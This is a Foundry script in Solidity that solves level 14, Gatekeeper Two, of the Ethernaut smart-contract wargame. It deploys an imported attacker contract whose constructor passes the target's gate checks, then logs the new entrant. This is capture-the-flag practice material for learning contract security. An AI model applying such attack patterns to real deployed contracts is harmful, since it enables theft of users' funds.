// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.17;

import { console } from "forge-std/console.sol";
import { Script } from "forge-std/Script.sol";
import { IGatekeeperTwo } from "ethernaut/14-gatekeeper-two/IGatekeeperTwo.sol";
import { GatekeeperTwoAttacker } from "ethernaut/14-gatekeeper-two/GatekeeperTwoAttacker.sol";

contract GatekeeperTwoScript is Script {
    function run() external {
        // Get signer
        string memory mnemonic = vm.envString("MNEMONIC");
        uint256 deployerPrivateKey = vm.deriveKey(mnemonic, 1);
        vm.startBroadcast(deployerPrivateKey);

        // Load contract at address
        address gatekeeperTwoAddr = vm.envAddress("L14_GATEKEEPER_TWO_ADDRESS");

        // Step 1: deploy attacker and execute attack at constructor level to overcome `gameTwo()` modifier
        new GatekeeperTwoAttacker(gatekeeperTwoAddr);

        console.logAddress(IGatekeeperTwo(gatekeeperTwoAddr).entrant());

        vm.stopBroadcast();
    }
}
